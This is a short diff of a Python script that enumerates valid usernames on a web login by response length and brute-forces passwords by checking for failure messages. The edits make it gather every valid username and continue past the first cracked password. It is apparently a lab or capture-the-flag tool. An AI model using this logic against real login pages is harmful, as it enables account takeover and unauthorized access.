@@ -28,9 +28,9 @@ def valid_username(url, usernames):
             if len(response_user._content) != 2994:
                 valid_usernames.append(username)
                 print("\nValid Username: {}".format(','.join(valid_usernames)))
-                return valid_usernames
-                
-    print("\nValid Usernames: {}".format(','.join(valid_usernames)))
+                # return valid_usernames
+     
+    print(f"\n[*] All valid usernames: {', '.join(valid_usernames)}")
     return valid_usernames
 
 def valid_password(url, valid_usernames, passwords,patterns):
@@ -45,7 +45,7 @@ def valid_password(url, valid_usernames, passwords,patterns):
             resp_clean = " ".join(re.sub(re.compile('<.*?>'), '', response_pass.text).split())
             if (patterns[0] not in resp_clean and patterns[1] not in resp_clean):            
                 valid_password[username] = password
-                return valid_password
+                break
     return valid_password
 
 def def_handler(key,frame):
